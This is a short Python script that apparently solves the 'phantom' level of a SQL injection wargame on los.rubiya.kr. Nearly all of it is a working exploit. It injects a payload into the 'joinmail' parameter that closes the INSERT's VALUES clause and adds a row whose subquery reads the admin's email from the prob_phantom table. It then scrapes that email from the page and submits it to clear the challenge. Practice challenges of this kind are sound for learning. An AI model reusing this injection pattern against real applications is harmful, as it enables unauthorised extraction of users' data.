import requests
import os
import re

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']
IP_ADDRESS = os.environ['IP_ADDRESS']

url = f"https://los.rubiya.kr/chall/phantom_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}



mail = ""
res = requests.get(url, params={'joinmail': f'\'), (99999,\'{IP_ADDRESS}\', (select email from prob_phantom _ where no=1)) #'},cookies=cookie)
pattern = re.compile(r'<tr>(.+?)</tr>')

for r in pattern.finditer(res.text):
    txt = r.group(1)
    if txt.find("<th>") >= 0 or txt.find("<td>127.0.0.1</td><td>") >= 0:
        continue
    print(txt)
    if txt.find("<td>admin") >= 0:
        mail_regex = re.compile(r'<td>(admin.+?)</td>')
        mail_match = mail_regex.findall(txt)
        if mail_match and len(mail_match) > 0:
            mail = mail_match[0]
            break

if mail == "":
    print("Failed to get mail")
    exit(1)

res = requests.get(url, params={'email': mail},cookies=cookie)
if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")

